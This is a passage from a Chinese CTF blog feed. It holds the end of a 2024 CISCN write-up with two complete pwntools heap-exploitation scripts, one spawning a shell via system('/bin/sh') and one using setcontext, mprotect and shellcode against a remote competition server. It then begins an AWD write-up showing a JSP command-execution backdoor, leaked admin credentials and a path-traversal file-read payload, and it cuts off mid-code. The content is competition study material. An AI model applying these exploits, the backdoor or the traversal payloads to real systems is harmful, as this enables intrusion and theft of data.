class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> varint<br><span class="hljs-keyword">import</span> sys<br>num=<span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Mode</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span>+varint.encode(m&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Ind</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x18&#x27;</span>+varint.encode(i&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Spbuf</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> s:<br>        s=<span class="hljs-number">0x30</span><br>    <span class="hljs-keyword">else</span>:<br>        s=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x20&#x27;</span>+varint.encode(s&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Data</span>(<span class="hljs-params">d</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0a&#x27;</span>+varint.encode(<span class="hljs-built_in">len</span>(d))+d<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Spchr</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x28&#x27;</span>+varint.encode(s)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">data</span>):<br>    mark=<span class="hljs-number">0xfff000000000</span><br>    data1=data&amp;mark<br>    result=<span class="hljs-number">0</span><br>    result|=data1<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        data1=((data1&gt;&gt;<span class="hljs-number">12</span>)^data)&amp;(mark&gt;&gt;<span class="hljs-number">12</span>)<br>        result|=data1<br>        mark=mark&gt;&gt;<span class="hljs-number">12</span><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    payload=Mode(<span class="hljs-number">1</span>)+Ind(ind)+Data(data)+Spbuf(<span class="hljs-number">0</span>)+Spchr(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">2</span>)+Ind(ind)+Data(<span class="hljs-string">b&#x27;test&#x27;</span>)+Spbuf(<span class="hljs-number">0</span>)+Spchr(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">none</span>():<br>    payload=Mode(<span class="hljs-number">0</span>)+Ind(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;test&#x27;</span>)+Spbuf(<span class="hljs-number">0</span>)+Spchr(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind,isbuf=<span class="hljs-number">0</span>,spchr=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">global</span> num<br>    payload=Mode(<span class="hljs-number">3</span>)+Ind(ind)+Spbuf(isbuf)+Spchr(spchr)+Data(<span class="hljs-string">b&#x27;test&#x27;</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>        p.readuntil(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>        num+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br>        pause<br><span class="hljs-comment">#        p.readuntil(&#x27;Content:&#x27;)</span><br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>p=process([<span class="hljs-string">&quot;./pwn&quot;</span>])<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&quot;0&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;testtest&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=d-<span class="hljs-number">0x21ac30</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>stdout=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>vtable=stdout+<span class="hljs-number">0xd0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(vtable))<br>obstack_jump=libc.address+<span class="hljs-number">0x2173c0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(i+<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i)<br><br>show(<span class="hljs-number">1</span>)<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>chunk0=calc(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;chunk0=: x&#125;</span>&quot;</span>)<br>free(<span class="hljs-number">7</span>)<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>chunk6=chunk0+<span class="hljs-number">0x1d60</span><br>chunk7=chunk0+<span class="hljs-number">0x2020</span><br>obstack=p64(system)<br>obstack+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(chunk7+<span class="hljs-number">8</span>)<br><span class="hljs-comment">#obstack=obstack.ljust(0x28,b&#x27;\x00&#x27;)+p64(0x7fffffffffffffff)+p64(0)+p64(system)</span><br><br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+p64((chunk6&gt;&gt;<span class="hljs-number">12</span>)^(chunk7-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">6</span>,payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;chunk6=: x&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;chunk7=: x&#125;</span>&quot;</span>)<br><br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">8</span>,p64((chunk7&gt;&gt;<span class="hljs-number">12</span>)^(chunk6)))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(vtable))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0</span>,obstack)<br><br><span class="hljs-comment">#show(0)</span><br><span class="hljs-comment">#show(0)</span><br><span class="hljs-comment">#@add(0)</span><br>free(<span class="hljs-number">6</span>)<br><span class="hljs-comment">#add(8,p64()</span><br><br><br>gdb.attach(p)<br>pause()<br>add(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x40</span>)+p64(((chunk6+<span class="hljs-number">0x10</span>)&gt;&gt;<span class="hljs-number">12</span>)^(vtable)))<br><br><span class="hljs-comment">#add(1,obstack)#</span><br>payload1=p64(<span class="hljs-number">0</span>)+p64(obstack_jump)+p64(chunk7-<span class="hljs-number">0x38</span>)<br>add(<span class="hljs-number">2</span>,payload1)<br>add(<span class="hljs-number">2</span>,payload1)<br><span class="hljs-comment">#add(0)</span><br><br><span class="hljs-comment">#print(hex(calc(d)))</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">l,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(l).encode())<br>    p.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>,data);<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;idx&quot;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)).encode())<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&quot;EzHeap&quot;)</span><br>p=remote(<span class="hljs-string">&quot;8.147.134.47&quot;</span>,<span class="hljs-string">&quot;35955&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp setcontext+0x3d&#x27;)</span><br>add(<span class="hljs-number">0x300</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x448</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x300</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x438</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x300</span>) <span class="hljs-comment">#4</span><br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span>+<span class="hljs-string">b&#x27;rotwilll&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br><br>p.readuntil(<span class="hljs-string">&#x27;rotwilll&#x27;</span>)<br>large=u64(p.readuntil(<span class="hljs-string">&#x27;Welcome&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(large))<br>pause()<br>libc.address=large-<span class="hljs-number">0x21b0e0</span><br>stdout=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>wfile_jump=libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>iolist=libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>success(<span class="hljs-string">f&quot;libcaddr=0x<span class="hljs-subst">&#123;libc.address:x&#125;</span>&quot;</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span>+p64(<span class="hljs-number">0x451</span>)+p64(large)*<span class="hljs-number">2</span>+p64(iolist-<span class="hljs-number">0x20</span>)*<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span>+<span class="hljs-string">b&#x27;rotwilll&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27;rotwilll&#x27;</span>)<br>chunk=u64(p.readuntil(<span class="hljs-string">&#x27;Welcome&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(chunk))<br><br>fake_io_add=chunk<br>chunk1=chunk-<span class="hljs-number">0x300</span><br>gs=chunk1<br>shelladd=chunk1+<span class="hljs-number">0x200</span><br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>)+shellcraft.read(<span class="hljs-number">3</span>,chunk,<span class="hljs-number">0x300</span>)+shellcraft.write(<span class="hljs-number">1</span>,chunk,<span class="hljs-number">0x300</span>)<br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>setcontext=libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0x167420</span><br><br>fake_io=flat(&#123;<br>    <span class="hljs-number">0x28</span>: [gs,<span class="hljs-number">1</span>],<br>    <span class="hljs-number">0x98</span>: fake_io_add+<span class="hljs-number">0x28</span>,<br>    <span class="hljs-number">0xa0</span>: fake_io_add,<br>    <span class="hljs-number">0xd8</span>: wfile_jump+<span class="hljs-number">0x30</span>,<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>gsdata=flat(&#123;<br>    <span class="hljs-number">8</span>: [gs,shelladd],<br>    <span class="hljs-number">0x20</span>: setcontext+<span class="hljs-number">0x3d</span>,<br>    <span class="hljs-number">0x28</span>: gadget,<br>    <span class="hljs-number">0x68</span>: gs&amp;(~<span class="hljs-number">0xfff</span>), <span class="hljs-comment"># rdi</span><br>    <span class="hljs-number">0x70</span>: <span class="hljs-number">0x1000</span>, <span class="hljs-comment"># rsi</span><br>    <span class="hljs-number">0x88</span>: <span class="hljs-number">7</span>, <span class="hljs-comment"># rdx</span><br>    <span class="hljs-number">0xa0</span>: gs+<span class="hljs-number">0x10</span>, <span class="hljs-comment">#rsp</span><br>    <span class="hljs-number">0xa8</span>: mprotect, <span class="hljs-comment">#rcx-&gt;rip</span><br>    <span class="hljs-number">0xe0</span>: gs<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-comment">#payload=fake_io#+asm(shellcode)</span><br><br>payload=gsdata<br>payload=payload.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=asm(shellcode)<br>payload=payload.ljust(<span class="hljs-number">0x300</span>)<br><span class="hljs-comment">#add(0x438,payload[0x10:])</span><br>payload=payload+fake_io<br><br>edit(<span class="hljs-number">2</span>,payload)<br><br><span class="hljs-comment">#exit()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><p><img src="/img/wp/2024/2024ciscn-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81-1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h1&gt;&lt;h2 id=&quot;Power-Trajectory-Diagram&quot;&gt;&lt;a href=&quot;#Power-Trajectory-Diag</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="ciscn" scheme="https://www.dr0n.top/tags/ciscn/"/>
    
    <category term="2024竞赛" scheme="https://www.dr0n.top/tags/2024%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>第一届长城杯信息安全铁人三项赛半决赛（第三赛区）AWD WP</title>
    <link href="https://www.dr0n.top/posts/359b7a99/"/>
    <id>https://www.dr0n.top/posts/359b7a99/</id>
    <published>2024-04-21T08:00:00.000Z</published>
    <updated>2025-07-27T09:59:24.315Z</updated>
    
    <content type="html"><![CDATA[<p>rank: 6</p><h1 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h1><h2 id="漏洞1-文件上传getshell"><a href="#漏洞1-文件上传getshell" class="headerlink" title="漏洞1-文件上传getshell"></a>漏洞1-文件上传getshell</h2><p><code>data.sql</code>泄露教师账号密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT INTO</span> `teacher` <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin1&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;admin@qq.com&#x27;</span>);<br></code></pre></td></tr></table></figure><p>登录后台<code>login.jsp</code></p><p>后台用户上传头像处存在任意文件上传</p><p><img src="/img/awd/ccb-tomcat-1.png"></p><p><strong>攻击：</strong></p><p><img src="/img/awd/ccb-tomcat-2.png"></p><p><strong>修复：</strong></p><p>修改后台密码&#x2F;修改上传代码&#x2F;增加waf</p><h2 id="漏洞2-默认后门"><a href="#漏洞2-默认后门" class="headerlink" title="漏洞2-默认后门"></a>漏洞2-默认后门</h2><p><code>\webapps\ROOT\forget.jsp</code>存在后门</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmdParameter</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd1&quot;</span>);<br>    <span class="hljs-keyword">if</span> (cmdParameter != <span class="hljs-literal">null</span> &amp;&amp; !cmdParameter.isEmpty()) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 构建系统命令</span><br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>();<br>            processBuilder.command(<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmdParameter);<br><br>            <span class="hljs-comment">// 执行命令并获取输出</span><br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> processBuilder.start();<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream));<br>            String line;<br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                output.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-comment">// 输出命令执行结果</span><br>            out.println(<span class="hljs-string">&quot;Command executed successfully. Output:\n&quot;</span> + output.toString());<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            out.println(<span class="hljs-string">&quot;Error executing command: &quot;</span> + e.getMessage());<br>        &#125;<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><strong>攻击：</strong></p><p>开局很快都修复了，手动交了两三个</p><p><strong>修复：</strong></p><p>把密码改了</p><h1 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h1><h2 id="漏洞1-任意文件读取"><a href="#漏洞1-任意文件读取" class="headerlink" title="漏洞1-任意文件读取"></a>漏洞1-任意文件读取</h2><p><code>\app\frontend\controller\Ajax.php</code> 存在任意文件读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">root_path</span>().<span class="hljs-string">&#x27;public/storage/uploads/&#x27;</span>.<span class="hljs-variable">$file</span>;<br>    <span class="hljs-comment">// 检查文件是否存在</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-variable">$result</span> = [<span class="hljs-string">&#x27;code&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">lang</span>(<span class="hljs-string">&#x27;file not exists!&#x27;</span>)];<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$result</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 获取文件名</span><br>    <span class="hljs-variable">$fileName</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br><br>    <span class="hljs-comment">// 设置HTTP响应头</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&#x27;</span> . <span class="hljs-variable">$fileName</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file</span>));<br><br>    <span class="hljs-comment">// 读取文件并输出给用户</span><br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br><br>    <span class="hljs-comment">// 终止脚本继续执行</span><br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>攻击：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/frontend/Ajax/getfile?file=../../../../../../flag<br></code></pre></td></tr></table></figure><p><img src="/img/awd/ccb-cms-1.png"></p><p><strong>修复：</strong></p><p>增加过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">root_path</span>().<span class="hljs-string">&#x27;public/storage/uploads/&#x27;</span>.<span class="hljs-variable">$file</span>;<br>        <span class="hljs-comment">// 检查文件是否存在</span><br><br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;../&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$file</span>);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$result</span> = [<span class="hljs-string">&#x27;code&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-title function_ 